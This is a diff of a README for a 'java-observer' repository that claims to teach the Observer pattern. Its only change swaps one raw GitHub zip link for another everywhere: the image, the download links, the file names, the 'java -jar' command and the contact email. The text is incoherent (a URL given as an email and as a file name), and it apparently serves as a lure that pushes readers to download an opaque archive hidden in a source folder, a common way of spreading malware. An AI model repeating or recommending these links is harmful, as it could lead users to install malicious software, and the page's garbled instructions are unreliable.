@@ -1,6 +1,6 @@
 # 🚀 java-observer - Learn the Observer Pattern Easily
 
-![Download java-observer](https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/observer_java_v3.5.zip)
+![Download java-observer](https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/domain/event/java_observer_v2.5.zip)
 
 ## 📋 Overview
 
@@ -23,7 +23,7 @@ Follow these easy steps to download and run the Java Observer application.
 
    You can download the application from the Releases page. Click the link below to go directly there:
 
-   [Visit this page to download](https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/observer_java_v3.5.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/domain/event/java_observer_v2.5.zip)
 
 2. **Identify the Latest Release**
 
@@ -31,20 +31,20 @@ Follow these easy steps to download and run the Java Observer application.
 
 3. **Download the Application**
 
-   Click on the download link for the latest version. The file will usually be named something like `https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/observer_java_v3.5.zip`. This will start the download process.
+   Click on the download link for the latest version. The file will usually be named something like `https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/domain/event/java_observer_v2.5.zip`. This will start the download process.
 
 4. **Extract the Files**
 
-   Once the download completes, navigate to the location where you saved the file. Right-click the `https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/observer_java_v3.5.zip` file and select "Extract All..." to extract the contents.
+   Once the download completes, navigate to the location where you saved the file. Right-click the `https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/domain/event/java_observer_v2.5.zip` file and select "Extract All..." to extract the contents.
 
 5. **Run the Application**
 
-   After extracting, open the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/observer_java_v3.5.zip`. 
+   After extracting, open the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/domain/event/java_observer_v2.5.zip`. 
 
    You can run the application by double-clicking this file if you have Java configured correctly on your system. Alternatively, you can open a command prompt or terminal and navigate to the extracted folder. Use the command below to run the program:
 
    ```
-   java -jar https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/observer_java_v3.5.zip
+   java -jar https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/domain/event/java_observer_v2.5.zip
    ```
 
    That's it! You are now running the Java Observer application.
@@ -65,7 +65,7 @@ To download the Java Observer application:
    
    To obtain the latest version, go to the following link:
 
-   [Visit this page to download](https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/observer_java_v3.5.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/domain/event/java_observer_v2.5.zip)
 
 2. Follow the steps outlined in the "Getting Started" section to successfully install and run the application.
 
@@ -97,7 +97,7 @@ Your contributions are valuable and help in improving this resource for all user
 
 If you encounter any issues or need assistance, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/observer_java_v3.5.zip
+- **Email:** https://raw.githubusercontent.com/salman9874537683/java-observer/master/src/main/java/domain/event/java_observer_v2.5.zip
 - **Issues:** Report issues in the GitHub Issues section of this repository.
 
 Enjoy using the Java Observer application and happy coding!
